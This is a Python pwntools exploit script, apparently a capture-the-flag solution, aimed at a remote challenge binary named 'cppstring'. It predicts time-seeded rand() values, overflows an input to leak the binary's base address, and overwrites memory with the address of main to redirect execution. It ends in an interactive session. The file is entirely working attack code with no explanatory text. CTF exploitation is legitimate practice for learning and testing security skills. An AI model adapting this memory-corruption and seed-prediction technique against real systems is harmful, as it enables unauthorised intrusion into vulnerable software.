#!/usr/bin/python3

from pwn import *
import random
import time
from ctypes import *

context.binary = exe = ELF('./cppstring_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
elf = cdll.LoadLibrary("libc.so.6")

#p = process(exe.path)
p = remote('chall.battlectf.online',1008)

def gen_seed():
    pkb = (((elf.time()) * 2003 // 9) >> 2) * elf.rand() * 30213741
    return c_ulong(pkb).value

elf.srand(gen_seed())
elf.srand(gen_seed())
elf.srand(gen_seed())

a = elf.rand()
log.info("guess: " + str(a))

payload = str(a).encode()
payload = payload.ljust(0x10f,b'A')

p.sendlineafter(b'number: ',payload)

p.recvuntil(payload)
p.recv(1)

exe_leak = u64(p.recv(6) + b'\0\0')
log.info("exe leak: " + hex(exe_leak))
exe.address = exe_leak - 0x163b
log.info("exe base: " + hex(exe.address))

# gdb.attach(p,gdbscript='''
#     b*play_game+57
#     b*play_game+80
#     b*play_game+85
#     b*play_game+92
#     b*play_game+101
#     b*play_game+104
#     b*play_game+220
#     b*play_game+244
#     c
#     ''')
# input()

payload = p64(exe.sym['main'])*0x100

p.sendlineafter(b'winner: ',payload)

elf.srand(gen_seed())
elf.srand(gen_seed())
elf.srand(gen_seed())

a = elf.rand()
log.info("guess: " + str(a))

payload = str(a).encode()

p.sendlineafter(b'number: ',payload)


p.sendlineafter(b'winner: ',b'hlaan')


p.interactive()